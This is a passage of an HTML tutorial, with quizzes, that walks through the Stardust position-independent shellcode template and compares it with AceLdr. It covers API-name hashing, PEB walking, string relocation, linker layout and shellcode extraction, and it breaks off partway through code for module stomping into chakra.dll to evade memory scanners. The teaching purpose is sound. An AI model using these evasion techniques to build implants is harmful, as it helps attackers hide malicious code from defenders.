+<div style="padding:12px;background:var(--yellow);color:var(--bg);text-align:center;font-weight:700">.rdata &mdash; "user32.dll", "Hello world", "caption" (strings)</div>
+<div style="padding:12px;background:var(--accent2);color:var(--bg);border-radius:0 0 8px 8px;font-weight:700;text-align:center">.text$C &mdash; RipData(), RetPtrData()</div>
+</div>
+<div style="margin-top:10px;color:var(--accent2)">
+<strong>RipStart()</strong> returns: start of .text$A (code base)<br>
+<strong>RipData()</strong> returns: start of .text$C (right after .rdata)<br>
+<strong>symbol&lt;T&gt;(s)</strong> uses RipData() to calculate actual string address
+</div>
+</div>
+</div>
+
+<h2>How RipStart and RipData Work Together</h2>
+<pre><code><span class="lang-tag">C++ - from main.cc constructor</span>// In the instance constructor:
+base.address = RipStart();   // Where does our shellcode start?
+base.length  = ( RipData() - base.address ) + END_OFFSET;  // How big is it?
+
+// RipData is at the END of the shellcode, RipStart at the BEGINNING
+// So the difference = total shellcode size</code></pre>
+
+<div class="quiz" id="quiz3">
+<h4>Pop Quiz: PIC Techniques</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why does Stardust need BOTH RipStart() and RipData()?</p>
+<label data-opt="0"><input type="radio" name="q3_0"> One is for x86, the other for x64</label>
+<label data-opt="1"><input type="radio" name="q3_0"> RipStart is a backup in case RipData fails</label>
+<label data-opt="2"><input type="radio" name="q3_0"> RipStart finds the code base address; RipData finds the data section for string access</label>
+<label data-opt="3"><input type="radio" name="q3_0"> They do the same thing but from different memory locations</label>
+<div class="explain">RipStart() returns the very beginning of the shellcode (useful for calculating total size and knowing where code starts). RipData() returns the position of the data section boundary, which the symbol&lt;T&gt; template uses to translate compile-time string pointers into runtime addresses.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: The magic number 0x1b in RipPtr (x64) represents what?</p>
+<label data-opt="0"><input type="radio" name="q3_1"> The size of the PE header</label>
+<label data-opt="1"><input type="radio" name="q3_1"> The byte distance from stardust: label to the RipPtr return address</label>
+<label data-opt="2"><input type="radio" name="q3_1"> A random obfuscation value</label>
+<label data-opt="3"><input type="radio" name="q3_1"> The stack alignment offset</label>
+<div class="explain">0x1b (27 bytes) is the sum of all instruction sizes from the stardust: label to the point where RipPtr reads [rsp]. It's a hardcoded compile-time constant. On x86 the offset is 0x11 (17 bytes) because x86 instructions are shorter.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz3')">Check Answers</button>
+<div class="quiz-result" id="quiz3-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(2)">&larr; Previous</button><button class="primary" onclick="goTo(4)">Next: Compile-Time Hashing &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 4 ========= -->
+<div class="module" id="mod4">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 5: Compile-Time FNV-1a Hashing</h1>
+<p class="subtitle">Strings disappear at build time. Only hashes remain.</p>
+
+<div class="card highlight">
+<h4>AceLdr vs Stardust: Different Hash Algorithms</h4>
+<p>AceLdr uses <strong>DJB2</strong> (hash * 33 + char, starting from 5381). Stardust uses <strong>FNV-1a</strong> (hash XOR char * prime, starting from 0x811c9dc5). Both serve the same purpose - hiding API names - but FNV-1a has better collision resistance and Stardust computes it entirely at <strong>compile time</strong>.</p>
+</div>
+
+<h2>The FNV-1a Algorithm</h2>
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">FNV-1a Hash Computation</h4>
+<div class="flow">
+<div class="box hl">hash = 0x811c9dc5<br><small>(FNV offset basis)</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">For each byte:<br>hash ^= byte</div>
+<div class="arrow">&rarr;</div>
+<div class="box y">hash *= 0x01000193<br><small>(FNV prime)</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">32-bit hash<br>output</div>
+</div>
+</div>
+
+<h2>Two Versions: Compile-Time and Runtime</h2>
+
+<h3>Compile-Time (consteval) - Used for Constants</h3>
+<pre><code><span class="lang-tag">C++ - constexpr.h</span>template &lt;typename T = char&gt;
+consteval auto hash_string( const T* string ) -> uint32_t {
+    uint32_t hash = 0x811c9dc5;
+    uint8_t  byte = 0;
+    while ( *string ) {
+        byte = static_cast&lt;uint8_t&gt;( *string++ );
+        if ( byte >= 'a' ) byte -= 0x20;  // uppercase
+        hash ^= byte;
+        hash *= 0x01000193;
+    }
+    return hash;
+}
+
+// Usage (compile time - string NEVER in binary):
+auto h = expr::hash_string( "NtAllocateVirtualMemory" ); // => constant</code></pre>
+
+<h3>Runtime - Used for PEB Walking</h3>
+<pre><code><span class="lang-tag">C++ - common.h</span>// Same algorithm but callable at runtime (for hashing DLL export names)
+template&lt;typename T = char&gt;
+inline auto declfn hash_string( const T* string ) -> uint32_t {
+    uint32_t hash = 0x811c9dc5;
+    uint8_t  byte = 0;
+    while ( *string ) {
+        byte = static_cast&lt;uint8_t&gt;( *string++ );
+        if ( byte >= 'a' ) byte -= 0x20;
+        hash ^= byte;
+        hash *= 0x01000193;
+    }
+    return hash;
+}
+
+// Usage (runtime - hashing export names found in DLL memory):
+if ( stardust::hash_string( exportName ) == target_hash ) { ... }</code></pre>
+
+<h2>Wide String Support (UTF-16)</h2>
+<p>Module names in the PEB are stored as <strong>wide strings</strong> (wchar_t, UTF-16). The template parameter <code>&lt;wchar_t&gt;</code> handles this:</p>
+<pre><code><span class="lang-tag">C++</span>// Compile-time hash of a wide string (for matching DLL names from PEB)
+resolve::module( expr::hash_string&lt;wchar_t&gt;( L"ntdll.dll" ) )
+//                                 ^^^^^^^^    ^^
+//                                 template     wide string literal
+//                                 param</code></pre>
+
+<h2>DJB2 vs FNV-1a Comparison</h2>
+<table>
+<tr><th>Property</th><th>DJB2 (AceLdr)</th><th>FNV-1a (Stardust)</th></tr>
+<tr><td>Initial value</td><td>5381</td><td>0x811c9dc5</td></tr>
+<tr><td>Operation</td><td>(hash &lt;&lt; 5) + hash + char</td><td>(hash ^ byte) * prime</td></tr>
+<tr><td>Multiplier</td><td>33 (implicit via shift)</td><td>0x01000193 (FNV prime)</td></tr>
+<tr><td>Collision resistance</td><td>Good</td><td>Better (mathematically proven)</td></tr>
+<tr><td>Compile-time capable?</td><td>Python script pre-computes</td><td>consteval computes in compiler</td></tr>
+<tr><td>String in binary?</td><td>No (hashes in #define)</td><td>No (consteval eliminates them)</td></tr>
+</table>
+
+<div class="card green">
+<h4>The Clever Bit: RESOLVE_TYPE</h4>
+<pre><code>#define RESOLVE_TYPE( s ) .s = reinterpret_cast&lt;decltype(s)*&gt;( expr::hash_string( #s ) )</code></pre>
+<p>The <code>#s</code> operator "stringifies" the macro argument. So <code>RESOLVE_TYPE(LoadLibraryA)</code> expands to:</p>
+<pre><code>.LoadLibraryA = reinterpret_cast&lt;decltype(LoadLibraryA)*&gt;( expr::hash_string("LoadLibraryA") )</code></pre>
+<p>At compile time, the hash is computed and the function pointer is temporarily set to the hash value. Later, <code>RESOLVE_IMPORT</code> replaces these hash values with real function addresses.</p>
+</div>
+
+<div class="quiz" id="quiz4">
+<h4>Pop Quiz: Hashing</h4>
+<div class="quiz-q" data-correct="0">
+<p>Q1: What are the two FNV-1a constants?</p>
+<label data-opt="0"><input type="radio" name="q4_0"> Offset basis: 0x811c9dc5, Prime: 0x01000193</label>
+<label data-opt="1"><input type="radio" name="q4_0"> Offset basis: 5381, Prime: 33</label>
+<label data-opt="2"><input type="radio" name="q4_0"> Offset basis: 0xDEADBEEF, Prime: 0x1337</label>
+<label data-opt="3"><input type="radio" name="q4_0"> Offset basis: 0, Prime: 31</label>
+<div class="explain">FNV-1a uses 0x811c9dc5 as the offset basis and 0x01000193 as the prime multiplier. These are standard values for the 32-bit variant defined in the FNV specification.</div>
+</div>
+<div class="quiz-q" data-correct="3">
+<p>Q2: What does the # operator do in <code>RESOLVE_TYPE(#s)</code>?</p>
+<label data-opt="0"><input type="radio" name="q4_1"> Comments out the argument</label>
+<label data-opt="1"><input type="radio" name="q4_1"> Converts to a number</label>
+<label data-opt="2"><input type="radio" name="q4_1"> Dereferences a pointer</label>
+<label data-opt="3"><input type="radio" name="q4_1"> Stringifies the macro argument (LoadLibraryA becomes "LoadLibraryA")</label>
+<div class="explain">The # operator in a macro converts the argument to a string literal. So #s where s=LoadLibraryA produces "LoadLibraryA". This is fed to consteval hash_string which computes the hash at compile time and the string never appears in the binary.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz4')">Check Answers</button>
+<div class="quiz-result" id="quiz4-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(3)">&larr; Previous</button><button class="primary" onclick="goTo(5)">Next: PEB &amp; API Resolution &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 5 ========= -->
+<div class="module" id="mod5">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: PEB Walking &amp; API Resolution</h1>
+<p class="subtitle">Finding ntdll and kernel32 without importing a single function.</p>
+
+<div class="card highlight">
+<h4>Same Concept, Modern Execution</h4>
+<p>The idea is identical to AceLdr's <code>FindModule</code>/<code>FindFunction</code>: walk the PEB's loaded module list, hash each name, match against a target hash, then walk the export table. But Stardust does it with C++ templates, FNV-1a, and a slick macro system.</p>
+</div>
+
+<h2>Module Resolution: Finding DLLs</h2>
+<pre><code><span class="lang-tag">C++ - resolve.cc</span>auto declfn resolve::module(
+    _In_ const uint32_t library_hash
+) -> uintptr_t {
+    // RangeHeadList is a macro that walks a doubly-linked list
+    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList,
+                   PLDR_DATA_TABLE_ENTRY, {
+
+        if ( !library_hash ) {
+            // Hash 0 = return first module (the exe itself)
+            return reinterpret_cast&lt;uintptr_t&gt;( Entry->DllBase );
+        }
+
+        // Hash this module's name and compare
+        if ( stardust::hash_string&lt;wchar_t&gt;( Entry->BaseDllName.Buffer )
+             == library_hash )
+        {
+            return reinterpret_cast&lt;uintptr_t&gt;( Entry->DllBase );
+        }
+    } )
+
+    return 0;  // Module not found
+}</code></pre>
+
+<h3>The RangeHeadList Macro</h3>
+<pre><code><span class="lang-tag">C++ - macros.h</span>#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
+{                                               \
+    PLIST_ENTRY __Head = ( &amp; HEAD_LIST );       \
+    PLIST_ENTRY __Next = { 0 };                 \
+    TYPE        Entry  = (TYPE)__Head->Flink;   \
+    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
+        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
+        SCOPE                   /* User code */  \
+        Entry = (TYPE)(__Next);                 \
+    }                                           \
+}</code></pre>
+<p>This replaces the manual <code>for</code> loop AceLdr uses. The third argument (<code>SCOPE</code>) is a block of code that gets pasted inside the loop body. Think of it as a poor man's lambda.</p>
+
+<h2>API Resolution: Finding Functions</h2>
+<pre><code><span class="lang-tag">C++ - resolve.cc</span>auto declfn resolve::_api(
+    _In_ const uintptr_t module_base,
+    _In_ const uintptr_t symbol_hash
+) -> uintptr_t {
+    auto dos_header = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;( module_base );
+
+    // Validate PE signatures
+    if ( dos_header->e_magic != IMAGE_DOS_SIGNATURE ) return 0;
+
+    auto nt_header = reinterpret_cast&lt;PIMAGE_NT_HEADERS&gt;(
+        module_base + dos_header->e_lfanew );
+    if ( nt_header->Signature != IMAGE_NT_SIGNATURE ) return 0;
+
+    // Navigate to export directory
+    auto export_dir = reinterpret_cast&lt;PIMAGE_EXPORT_DIRECTORY&gt;(
+        module_base + nt_header->OptionalHeader
+            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );
+
+    // Three parallel arrays (same as AceLdr's FindFunction)
+    auto export_names = reinterpret_cast&lt;PDWORD&gt;( module_base + export_dir->AddressOfNames );
+    auto export_addrs = reinterpret_cast&lt;PDWORD&gt;( module_base + export_dir->AddressOfFunctions );
+    auto export_ordns = reinterpret_cast&lt;PWORD&gt;( module_base + export_dir->AddressOfNameOrdinals );
+
+    for ( int i = 0; i &lt; export_dir->NumberOfNames; i++ ) {
+        auto symbol_name = reinterpret_cast&lt;PSTR&gt;( module_base + export_names[i] );
+
+        // Runtime hash of export name vs compile-time hash of target
+        if ( stardust::hash_string( symbol_name ) != symbol_hash )
+            continue;
+
+        return module_base + export_addrs[ export_ordns[i] ];
+    }
+    return 0;
+}</code></pre>
+
+<h2>The RESOLVE_IMPORT Macro: Bulk Resolution</h2>
+<pre><code><span class="lang-tag">C++ - macros.h</span>#define RESOLVE_IMPORT( m ) { \
+    for ( int i = 1; i &lt; expr::struct_count&lt;decltype( instance::m )&gt;(); i++ ) { \
+        reinterpret_cast&lt;uintptr_t*&gt;( &amp;m )[ i ] = \
+            resolve::_api( m.handle, reinterpret_cast&lt;uintptr_t*&gt;( &amp;m )[ i ] ); \
+    } \
+}</code></pre>
+
+<div class="card">
+<h4>How RESOLVE_IMPORT Works (Step by Step)</h4>
+<ol>
+<li><code>struct_count()</code> calculates how many pointer-sized members the struct has</li>
+<li>The loop starts at index 1 (skipping <code>handle</code> at index 0)</li>
+<li>Each member was initialized with its <strong>hash value</strong> by <code>RESOLVE_TYPE</code></li>
+<li>The loop reads the hash, calls <code>resolve::_api()</code> to get the real address, and <strong>overwrites</strong> the hash with the function pointer</li>
+</ol>
+</div>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">RESOLVE_IMPORT Transformation</h4>
+<div style="display:flex;gap:20px;justify-content:center;flex-wrap:wrap">
+<div style="flex:1;min-width:250px">
+<p style="text-align:center;color:var(--yellow);font-weight:700;margin-bottom:8px">Before RESOLVE_IMPORT</p>
+<div class="flow" style="flex-direction:column;gap:2px">
+<div class="box y" style="width:100%;font-size:.75rem">kernel32.handle = 0x7FFE8000 (base addr)</div>
+<div class="box y" style="width:100%;font-size:.75rem">kernel32.LoadLibraryA = 0xA3C2B1D4 (hash!)</div>
+<div class="box y" style="width:100%;font-size:.75rem">kernel32.GetProcAddress = 0xE7F53218 (hash!)</div>
+</div>
+</div>
+<div style="flex:1;min-width:250px">
+<p style="text-align:center;color:var(--green);font-weight:700;margin-bottom:8px">After RESOLVE_IMPORT</p>
+<div class="flow" style="flex-direction:column;gap:2px">
+<div class="box g" style="width:100%;font-size:.75rem">kernel32.handle = 0x7FFE8000 (unchanged)</div>
+<div class="box g" style="width:100%;font-size:.75rem">kernel32.LoadLibraryA = 0x7FFE9A30 (real addr!)</div>
+<div class="box g" style="width:100%;font-size:.75rem">kernel32.GetProcAddress = 0x7FFE9B10 (real addr!)</div>
+</div>
+</div>
+</div>
+</div>
+
+<div class="quiz" id="quiz5">
+<h4>Pop Quiz: API Resolution</h4>
+<div class="quiz-q" data-correct="1">
+<p>Q1: In RESOLVE_IMPORT, why does the loop start at index 1?</p>
+<label data-opt="0"><input type="radio" name="q5_0"> Because index 0 is reserved for the return value</label>
+<label data-opt="1"><input type="radio" name="q5_0"> Because index 0 is the module handle (already resolved, not a hash)</label>
+<label data-opt="2"><input type="radio" name="q5_0"> Because arrays in C++ are 1-indexed</label>
+<label data-opt="3"><input type="radio" name="q5_0"> To skip the vtable pointer</label>
+<div class="explain">The struct layout is: [handle, func1, func2, ...]. The handle at index 0 was already set to the real module base address. Only indices 1+ contain hash values that need to be resolved to function pointers.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: What does struct_count&lt;T&gt;() calculate?</p>
+<label data-opt="0"><input type="radio" name="q5_1"> The number of pointer-sized members in a struct</label>
+<label data-opt="1"><input type="radio" name="q5_1"> The total size of the struct in bytes</label>
+<label data-opt="2"><input type="radio" name="q5_1"> The number of functions in the struct</label>
+<label data-opt="3"><input type="radio" name="q5_1"> The alignment requirement</label>
+<div class="explain">struct_count divides sizeof(T) by sizeof(uintptr_t). Since all members are either uintptr_t (handle) or function pointers (same size), this gives the number of members. It's a compile-time estimation that works because the struct is packed with pointer-sized fields.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz5')">Check Answers</button>
+<div class="quiz-result" id="quiz5-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(4)">&larr; Previous</button><button class="primary" onclick="goTo(6)">Next: The symbol&lt;T&gt; Template &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 6 ========= -->
+<div class="module" id="mod6">
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 7: The symbol&lt;T&gt; Template</h1>
+<p class="subtitle">How to use strings in shellcode without knowing your own address.</p>
+
+<div class="card highlight">
+<h4>The String Problem</h4>
+<p>Shellcode needs strings: <code>"user32.dll"</code>, <code>"Hello world"</code>. But the compiler puts strings in <code>.rdata</code> and references them with absolute addresses. At an unknown injection address, those addresses are wrong. Stardust's <code>symbol&lt;T&gt;</code> template translates compile-time pointers to runtime addresses using <code>RipData()</code>.</p>
+</div>
+
+<h2>The symbol&lt;T&gt; Implementation</h2>
+<pre><code><span class="lang-tag">C++ - common.h</span>template &lt;typename T&gt;
+inline T symbol(T s) {
+    return reinterpret_cast&lt;T&gt;(
+        RipData() - (
+            reinterpret_cast&lt;uintptr_t&gt;(&amp;RipData)
+            - reinterpret_cast&lt;uintptr_t&gt;(s)
+        )
+    );
+}
+
+// Usage:
+kernel32.LoadLibraryA( symbol&lt;const char*&gt;( "user32.dll" ) );</code></pre>
+
+<h2>Breaking It Down</h2>
+<div class="card">
+<h4>The Math Behind symbol&lt;T&gt;</h4>
+<p>Let's trace through what happens:</p>
+<ol>
+<li><strong>At compile time:</strong> <code>s</code> = pointer to <code>"user32.dll"</code> in <code>.rdata</code> (absolute, like <code>0x1234</code>)</li>
+<li><strong>At compile time:</strong> <code>&amp;RipData</code> = address of the <code>RipData</code> function (absolute, like <code>0x5678</code>)</li>
+<li><strong>Compile-time distance:</strong> <code>&amp;RipData - s = 0x5678 - 0x1234 = 0x4444</code></li>
+<li><strong>At runtime:</strong> <code>RipData()</code> returns the <strong>actual</strong> address of RipData (like <code>0xABCD5678</code>)</li>
+<li><strong>Runtime address of string:</strong> <code>RipData() - distance = 0xABCD5678 - 0x4444 = 0xABCD1234</code></li>
+</ol>
+<p>The distance between <code>RipData</code> and the string is <strong>constant</strong> regardless of where the shellcode is loaded. That's why this works!</p>
+</div>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">symbol&lt;T&gt; Address Translation</h4>
+<div style="max-width:550px;margin:0 auto;font-family:monospace;font-size:.82rem">
+<div style="padding:10px;background:var(--surface2);border-radius:8px;margin-bottom:10px">
+<strong style="color:var(--yellow)">Compile Time (addresses at base 0x0000):</strong><br>
+.text$B code .............. 0x0050<br>
+.rdata "user32.dll" ....... 0x0200 &larr; <span style="color:var(--yellow)">s = 0x0200</span><br>
+.text$C RipData ........... 0x0300 &larr; <span style="color:var(--yellow)">&amp;RipData = 0x0300</span><br>
+<span style="color:var(--dim)">distance = 0x0300 - 0x0200 = 0x0100</span>
+</div>
+<div style="padding:10px;background:var(--surface2);border-radius:8px">
+<strong style="color:var(--green)">Runtime (loaded at 0x7FFE0000):</strong><br>
+.text$B code .............. 0x7FFE0050<br>
+.rdata "user32.dll" ....... 0x7FFE0200 &larr; <span style="color:var(--green)">actual string location</span><br>
+.text$C RipData() returns . 0x7FFE0300<br>
+<span style="color:var(--green)">symbol() = 0x7FFE0300 - 0x0100 = 0x7FFE0200</span>
+</div>
+</div>
+</div>
+
+<h3>The G_SYM Macro Alternative</h3>
+<pre><code><span class="lang-tag">C++ - macros.h</span>// Macro version of the same calculation (for use in C-style code)
+#define G_SYM( s ) (uintptr_t)( RipData() - ( ((uintptr_t)&amp;RipData) - ((uintptr_t)s) ) )</code></pre>
+
+<h2>Comparison with AceLdr's OFFSET Macro</h2>
+<div class="versus">
+<div>
+<h5 style="color:var(--accent)">AceLdr: OFFSET(x)</h5>
+<pre style="font-size:.75rem;margin:5px 0"><code>GetIp() - (&amp;GetIp - x)</code></pre>
+<p style="font-size:.8rem">Uses <code>GetIp()</code> which returns its own address. Works for finding ANY symbol relative to GetIp. Used for both code and data.</p>
+</div>
+<div>
+<h5 style="color:var(--accent2)">Stardust: symbol&lt;T&gt;(s)</h5>
+<pre style="font-size:.75rem;margin:5px 0"><code>RipData() - (&amp;RipData - s)</code></pre>
+<p style="font-size:.8rem">Uses <code>RipData()</code> which sits at the .rdata/.text$C boundary. Specifically designed for resolving string addresses in .rdata.</p>
+</div>
+</div>
+
+<div class="quiz" id="quiz6">
+<h4>Pop Quiz: symbol&lt;T&gt;</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why can't shellcode just use <code>"hello"</code> string literals directly?</p>
+<label data-opt="0"><input type="radio" name="q6_0"> Strings are encrypted by the compiler</label>
+<label data-opt="1"><input type="radio" name="q6_0"> Windows blocks string access in injected code</label>
+<label data-opt="2"><input type="radio" name="q6_0"> The compiler uses absolute addresses for .rdata strings, which are wrong at the injection address</label>
+<label data-opt="3"><input type="radio" name="q6_0"> Strings take too much memory</label>
+<div class="explain">The compiler puts "hello" in .rdata and generates code like "mov rax, 0x140002000" to access it. But that absolute address is only correct if the PE is loaded at its preferred ImageBase. Shellcode is loaded at an arbitrary address, so the absolute reference points to garbage. symbol&lt;T&gt; recalculates the correct address at runtime.</div>
+</div>
+<div class="quiz-q" data-correct="0">
+<p>Q2: What stays constant regardless of where shellcode is loaded?</p>
+<label data-opt="0"><input type="radio" name="q6_1"> The distance between any two points within the shellcode</label>
+<label data-opt="1"><input type="radio" name="q6_1"> The absolute addresses of functions</label>
+<label data-opt="2"><input type="radio" name="q6_1"> The stack pointer value</label>
+<label data-opt="3"><input type="radio" name="q6_1"> The base address</label>
+<div class="explain">This is the fundamental principle of position-independent code. If RipData is 0x100 bytes after "user32.dll" at compile time, it will ALWAYS be 0x100 bytes after it at runtime, no matter where the shellcode is loaded. Only the absolute base changes; all relative distances are preserved.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz6')">Check Answers</button>
+<div class="quiz-result" id="quiz6-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(5)">&larr; Previous</button><button class="primary" onclick="goTo(7)">Next: Linker Script &amp; Sections &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 7 ========= -->
+<div class="module" id="mod7">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: The Linker Script &amp; Section Layout</h1>
+<p class="subtitle">Three lines that control everything.</p>
+
+<div class="card highlight">
+<h4>Why Section Order Matters</h4>
+<p>The entire PIC scheme depends on <code>RipStart</code> being at the beginning and <code>RipData</code> being right after the data. If the linker rearranges sections, every <code>OFFSET</code> and <code>symbol&lt;T&gt;</code> calculation breaks. The linker script is the glue holding the architecture together.</p>
+</div>
+
+<h2>The Linker Script</h2>
+<pre><code><span class="lang-tag">LD - scripts/linker.ld</span>SECTIONS
+{
+    .text :
+    {
+        *( .text$A );    /* ASM: stardust(), RipStart(), RipPtr() */
+        *( .text$B );    /* C++: entry(), instance, resolve::* */
+        *( .rdata* );    /* Read-only data: all string literals */
+        *( .text$C );    /* ASM: RipData(), RetPtrData() */
+    }
+}</code></pre>
+
+<div class="card">
+<h4>Why This Specific Order?</h4>
+<ol>
+<li><strong>.text$A first:</strong> Entry point must be at byte 0 of the shellcode. When the injector calls the shellcode, it calls the very first byte, which is <code>stardust:</code></li>
+<li><strong>.text$B second:</strong> All C++ code. The <code>declfn</code> attribute places functions here</li>
+<li><strong>.rdata between code sections:</strong> Strings are sandwiched between code. This is critical - <code>RipData</code> needs to be adjacent to (right after) the data</li>
+<li><strong>.text$C last:</strong> <code>RipData()</code> is the last function. Its address minus the string's address gives the correct offset</li>
+</ol>
+</div>
+
+<h2>How declfn Controls Placement</h2>
+<pre><code><span class="lang-tag">C++ - macros.h</span>#define declfn __attribute__(( section( ".text$B" ) ))
+
+// Every function marked with declfn goes into .text$B:
+auto declfn instance::start( void* arg ) -> void { ... }
+auto declfn resolve::module( uint32_t hash ) -> uintptr_t { ... }
+auto declfn resolve::_api( uintptr_t mod, uintptr_t hash ) -> uintptr_t { ... }</code></pre>
+
+<h2>Stardust vs AceLdr Linker Scripts</h2>
+<div class="versus">
+<div>
+<h5 style="color:var(--accent)">AceLdr (6 code sections)</h5>
+<pre style="font-size:.72rem;margin:5px 0"><code>.text$A - Entry (start.asm)
+.text$B - Loader (ace.c)
+.text$C - Stub data (misc.asm)
+.text$D - Hooks (delay,heap,spoof)
+.text$E - Utilities (util.c)
+.text$F - GetIp + ACELDR marker</code></pre>
+</div>
+<div>
+<h5 style="color:var(--accent2)">Stardust (3 code + 1 data)</h5>
+<pre style="font-size:.72rem;margin:5px 0"><code>.text$A - Entry + RipStart (asm)
+.text$B - ALL C++ code
+.rdata  - ALL strings/data
+.text$C - RipData (asm)</code></pre>
+</div>
+</div>
+
+<h2>The objcopy Extraction</h2>
+<p>After linking, the entire <code>.text</code> section (which now contains code AND data thanks to the linker script) is extracted as raw shellcode:</p>
+<pre><code><span class="lang-tag">Shell</span># Extract the .text section (contains .text$A + .text$B + .rdata + .text$C)
+objcopy --dump-section .text=bin/stardust.x64.bin bin/stardust.x64.exe
+
+# The resulting .bin file IS the shellcode. No PE headers. No metadata.
+# Just raw bytes: [entry code][implant code][strings][RipData]</code></pre>
+
+<div class="quiz" id="quiz7">
+<h4>Pop Quiz: Linker Script</h4>
+<div class="quiz-q" data-correct="3">
+<p>Q1: Why is .rdata placed BETWEEN .text$B and .text$C?</p>
+<label data-opt="0"><input type="radio" name="q7_0"> For better cache performance</label>
+<label data-opt="1"><input type="radio" name="q7_0"> Because the linker requires it</label>
+<label data-opt="2"><input type="radio" name="q7_0"> To separate entry code from utility code</label>
+<label data-opt="3"><input type="radio" name="q7_0"> So RipData() in .text$C is adjacent to the data, making symbol&lt;T&gt; offset calculations work</label>
+<div class="explain">RipData() sits in .text$C, immediately after .rdata. The symbol&lt;T&gt; template computes: RipData() - (&amp;RipData - string_addr). This only works if RipData and the string are close together with a known, constant distance. Placing .rdata right before .text$C guarantees this.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What tool extracts the final shellcode from the PE?</p>
+<label data-opt="0"><input type="radio" name="q7_1"> A Python script with pefile</label>
+<label data-opt="1"><input type="radio" name="q7_1"> objcopy --dump-section</label>
+<label data-opt="2"><input type="radio" name="q7_1"> strip -o</label>
+<label data-opt="3"><input type="radio" name="q7_1"> The linker outputs it directly</label>
+<div class="explain">objcopy (from GNU binutils) with --dump-section extracts a named section to a file. Since the linker script puts everything into .text, this one command produces the final shellcode binary. AceLdr used a Python script instead.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz7')">Check Answers</button>
+<div class="quiz-result" id="quiz7-result"></div>
+</div>
+
+<div class="nav-btns"><button onclick="goTo(6)">&larr; Previous</button><button class="primary" onclick="goTo(8)">Next: Module Stomping &rarr;</button></div>
+</div>
+
+<!-- ========= MODULE 8 ========= -->
+<div class="module" id="mod8">
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 9: Module Stomping</h1>
+<p class="subtitle">Hiding shellcode inside a legitimate DLL's code section.</p>
+
+<div class="card highlight">
+<h4>What is Module Stomping?</h4>
+<p>Instead of allocating fresh memory (which scanners flag as "unbacked private memory"), you load a <strong>legitimate DLL</strong> into the process, then <strong>overwrite its .text section</strong> with your shellcode. Now your code lives in memory that appears to belong to a signed, trusted Microsoft DLL. Memory scanners see <code>chakra.dll</code>, not suspicious private memory.</p>
+</div>
+
+<h2>The Stomper Test Harness</h2>
+<p>Stardust includes <code>test/stomper.cc</code> that demonstrates this technique using <code>chakra.dll</code> (Microsoft's JavaScript engine):</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Module Stomping Flow</h4>
+<div class="flow" style="flex-direction:column;gap:4px;max-width:600px;margin:0 auto">
+<div class="box" style="width:100%">1. Read shellcode from file (stardust.x64.bin)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box hl" style="width:100%">2. LoadLibraryExA("chakra.dll", DONT_RESOLVE_DLL_REFERENCES)</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">3. Parse chakra.dll PE headers, find .text section</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">4. VirtualProtect(.text, PAGE_READWRITE) - make it writable</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box r" style="width:100%">5. memcpy(entryPoint, shellcode, size) - OVERWRITE the code</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box y" style="width:100%">6. VirtualProtect(.text, PAGE_EXECUTE_READ) - restore RX</div>
+<div style="text-align:center;color:var(--dim)">&darr;</div>
+<div class="box g" style="width:100%">7. Call entry point - shellcode executes from chakra.dll's .text!</div>
+</div>
+</div>
+
+<h3>Key Concepts in the Stomper</h3>
+<pre><code><span class="lang-tag">C++ - stomper.cc (conceptual flow)</span>// Load a legitimate DLL without initializing it
+// DONT_RESOLVE_DLL_REFERENCES prevents DllMain from running
+HMODULE hModule = LoadLibraryExA( "chakra.dll", NULL,
+                                   DONT_RESOLVE_DLL_REFERENCES );
+
+// Parse PE to find the .text section
+auto dos = (PIMAGE_DOS_HEADER) hModule;
+auto nt  = (PIMAGE_NT_HEADERS)( (PBYTE)hModule + dos->e_lfanew );
+auto sec = IMAGE_FIRST_SECTION( nt );
+
+// Find the .text section
+for ( int i = 0; i &lt; nt->FileHeader.NumberOfSections; i++ ) {
+    if ( memcmp( sec[i].Name, ".text", 5 ) == 0 ) {
+        PVOID textBase = (PBYTE)hModule + sec[i].VirtualAddress;
+        // Make writable, copy shellcode, restore protections
